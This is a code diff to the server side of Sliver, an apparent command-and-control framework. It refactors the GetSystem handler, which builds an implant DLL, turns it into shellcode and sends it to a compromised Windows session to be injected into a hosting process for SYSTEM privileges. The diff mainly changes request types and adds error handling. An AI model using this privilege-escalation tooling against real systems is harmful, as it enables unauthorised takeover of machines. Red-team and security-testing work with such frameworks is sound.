@@ -61,16 +61,13 @@ func (rpc *Server) RevToSelf(ctx context.Context, req *sliverpb.RevToSelfReq) (*
 }
 
 // GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
-func (rpc *Server) GetSystem(ctx context.Context, req *sliverpb.GetSystemReq) (*sliverpb.GetSystem, error) {
+func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*sliverpb.GetSystem, error) {
 	sliver := core.Hive.Sliver(req.Request.SessionID)
 	if sliver == nil {
 		return nil, ErrInvalidSessionID
 	}
 
-	// TODO: Previously we let the client set the config, now we
-	// 		 just pull it from our version on the server.
-	config := generate.SliverConfigFromProtobuf(sliver.Config())
-
+	config := generate.ImplantConfigFromProtobuf(req.Config)
 	config.Format = clientpb.ImplantConfig_SHARED_LIB
 	config.ObfuscateSymbols = false
 	dllPath, err := generate.SliverSharedLibrary(config)
@@ -81,14 +78,17 @@ func (rpc *Server) GetSystem(ctx context.Context, req *sliverpb.GetSystemReq) (*
 	if err != nil {
 		return nil, err
 	}
-	data, _ := proto.Marshal(&sliverpb.GetSystemReq{
+	data, err := proto.Marshal(&sliverpb.InvokeGetSystemReq{
 		Data:           shellcode,
 		HostingProcess: req.HostingProcess,
 		Request:        req.GetRequest(),
 	})
+	if err != nil {
+		return nil, err
+	}
 
 	timeout := time.Duration(req.Request.Timeout)
-	data, err = sliver.Request(sliverpb.MsgGetSystemReq, timeout, data)
+	data, err = sliver.Request(sliverpb.MsgInvokeGetSystemReq, timeout, data)
 	getSystem := &sliverpb.GetSystem{}
 	err = proto.Unmarshal(data, getSystem)
 	if err != nil {
